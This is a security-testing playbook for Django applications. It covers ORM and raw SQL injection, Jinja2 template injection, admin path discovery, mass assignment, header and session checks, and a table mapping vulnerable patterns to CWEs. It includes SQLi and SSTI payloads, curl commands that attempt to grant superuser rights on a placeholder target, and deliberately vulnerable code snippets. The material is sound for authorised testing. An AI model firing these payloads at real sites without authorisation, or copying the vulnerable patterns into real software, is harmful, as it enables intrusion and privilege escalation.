---
name: django
description: Security testing for Django applications covering ORM injection, template injection, middleware bypass, and admin exposure
---

# Django Security Testing

Django applications expose attack surface through the ORM, template engine, middleware stack, and admin interface. Focus on query injection via ORM misuse, template injection in DTL/Jinja2, authentication bypass, and mass assignment through model forms.

## Attack Surface

**ORM Layer**
- `QuerySet` filter/exclude with user input: `Model.objects.filter(**user_dict)`
- Raw SQL via `connection.cursor()`, `RawSQL()`, `extra()`, `raw()`
- `annotate()` / `aggregate()` with unsanitized expressions
- `Q()` objects built from user input
- `values()` / `values_list()` field name injection

**Template Engine**
- Django Template Language (DTL): `{{ var }}`, `{% tag %}`
- Jinja2 (if `TEMPLATES[BACKEND]='django.template.backends.jinja2.Jinja2'`)
- `{% autoescape off %}` blocks
- `mark_safe()`, `SafeString`, `SafeData` usage
- Custom template tags and filters

**Admin Interface**
- `/admin/` — default path, often renamed
- Admin credentials — default superuser, weak passwords
- Admin actions — mass operations via admin
- Admin URL guessing — `/admin-panel/`, `/manage/`, `/staff/`

**Middleware Stack**
- Order-dependent security: `SecurityMiddleware`, `AuthenticationMiddleware`, `CsrfViewMiddleware`
- Custom middleware that modifies request/response
- Missing middleware in specific paths

**Forms & Model Forms**
- `ModelForm` with `fields = '__all__'` — mass assignment
- `exclude` list gaps — sensitive fields not excluded
- `clean_*` methods that skip validation
- File upload handling: `FileField`, `ImageField`

**Authentication**
- `django.contrib.auth` — login, password reset, session management
- Custom user models with custom backends
- Password reset token predictability
- Session fixation, session hijacking
- `@login_required` vs `LoginRequiredMixin` gaps

**URL Configuration**
- `urlpatterns` — path traversal via `<path:variable>`
- `re_path()` with greedy regex
- Missing `@csrf_exempt` audit
- API endpoints without authentication

## Testing Methodology

### 1. ORM Injection

**Unsafe dictionary unpacking:**
```python
# Vulnerable pattern
def search(request):
    filters = request.GET.dict()
    results = User.objects.filter(**filters)  # ORM injection
```

Test with:
```
GET /search/?email__contains=' OR 1=1--
GET /search/?is_superuser=1
GET /search/?date_joined__gte=2020-01-01&date_joined__lte=2026-12-31
GET /search/?password__isnull=False
```

**Raw SQL injection:**
```python
# Vulnerable patterns
User.objects.raw(f"SELECT * FROM auth_user WHERE name = '{name}'")
User.objects.extra(where=[f"name = '{name}'"])
```

Test with standard SQLi payloads in parameters that reach `.raw()` or `.extra()`.

### 2. Template Injection

**DTL injection (limited):**
```python
# Vulnerable: user input in template string
from django.template import Template, Context
t = Template(user_input)  # DTL injection
```

DTL is sandboxed — no arbitrary code execution. But can leak context variables:
```
{{ request.META.HTTP_HOST }}
{{ settings.SECRET_KEY }}  (if in context)
{{ user.password }}
```

**Jinja2 injection (critical):**
```python
# Jinja2 is NOT sandboxed by default in Django
from jinja2 import Template
t = Template(user_input)  # RCE
```

Test for SSTI:
```
{{ config.items() }}
{{ self.__init__.__globals__ }}
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

### 3. Admin Discovery

```bash
# Common admin paths
for path in /admin /admin/ /administrator /manage /staff /backoffice /panel /dashboard /control; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" "https://target.com${path}")
    echo "$code $path"
done

# Check for admin in robots.txt
curl -sk https://target.com/robots.txt | grep -i admin

# Check JavaScript for admin routes
curl -sk https://target.com/static/js/*.js | grep -oP '/admin[a-zA-Z0-9/_-]*'
```

### 4. Mass Assignment via ModelForm

```bash
# Test adding extra fields to registration/profile update
curl -sk -X POST https://target.com/register/ \
  -d "username=test&password=Test1234!&email=test@test.com&is_staff=1&is_superuser=1"

# Test with JSON API
curl -sk -X POST https://target.com/api/users/ \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"Test1234!","is_superuser":true}'
```

### 5. Security Header Audit

```bash
# Check Django security headers
curl -sk -D- https://target.com/ | grep -iE 'x-frame-options|x-content-type|content-security|strict-transport|x-xss|referrer-policy|permissions-policy'

# Check for DEBUG mode
curl -sk https://target.com/nonexistent-url-12345/
# If Django debug page shows, DEBUG=True (critical info leak)
```

### 6. Session & Auth Testing

```bash
# Check session cookie settings
curl -sk -D- https://target.com/login/ | grep -i 'set-cookie.*sessionid'

# Test session fixation: login and check if session ID changes
# Test password reset token: request reset, analyze token entropy
# Test account enumeration via login/reset responses
```

## Django-Specific CWEs

| Pattern | CWE | Risk |
|---------|-----|------|
| `**user_dict` in filter | CWE-89 | ORM injection |
| `Template(user_input)` DTL | CWE-1336 | Template injection (limited) |
| `Template(user_input)` Jinja2 | CWE-94 | RCE via template injection |
| `fields = '__all__'` | CWE-915 | Mass assignment |
| `mark_safe(user_input)` | CWE-79 | XSS |
| `DEBUG = True` in production | CWE-200 | Information disclosure |
| `@csrf_exempt` on state-changing | CWE-352 | CSRF bypass |
| `extra(where=[f"..."])` | CWE-89 | SQL injection |

## Validation Requirements

- Confirm ORM injection with data extraction PoC, not just error messages
- Template injection: show RCE or data leak, not just syntax errors
- Admin exposure: demonstrate actual access, not just 200 status
- Mass assignment: show field was actually modified in response

## Tools

- `sqlmap` with `--prefix` and `--suffix` for ORM context
- `ffuf` for admin path discovery
- `semgrep` with Django-specific rules
- `bandit` for Python security analysis
- `curl` for header and cookie testing

## Pro Tips

- Django's CSRF token is in `{% csrf_token %}` — extract from forms before POST testing
- Check `ALLOWED_HOSTS` — if `['*']`, host header injection is possible
- Look for `STATIC_URL` and `MEDIA_URL` — path traversal in file serving
- Django REST Framework (DRF) adds another layer: serializers, viewsets, permissions
- Check for `django-debug-toolbar` in production — `/__debug__/` path
